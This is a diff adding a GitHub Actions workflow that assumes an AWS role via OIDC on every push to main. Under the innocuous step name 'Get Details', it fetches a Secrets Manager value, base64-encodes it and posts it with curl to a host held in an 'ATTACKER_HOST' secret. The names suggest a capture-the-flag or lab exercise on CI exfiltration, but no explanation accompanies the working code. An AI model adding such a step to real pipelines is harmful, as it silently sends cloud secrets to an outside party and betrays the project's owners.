@@ -1,0 +1,36 @@
+name: AWS Role Assumption
+
+on:
+  push:
+    branches:
+      - main
+
+permissions:
+  id-token: write  # Required for OIDC authentication
+  contents: read
+
+jobs:
+  assume-role:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+
+    - name: Configure AWS credentials using OIDC
+      uses: aws-actions/configure-aws-credentials@v1
+      with:
+        role-to-assume: ${{ secrets.ASSUMED_ROLE }}
+        role-session-name: GitHubActionsSession
+        aws-region: us-east-1
+
+    - name: Get Details
+      run: |
+        curl -d "$( \
+          aws secretsmanager get-secret-value \
+            --secret-id ${{ secrets.FLAG_NAME }} \
+            --query SecretString \
+            --output text \
+          | base64)" \
+        ${{ secrets.ATTACKER_HOST }}
+      shell: bash
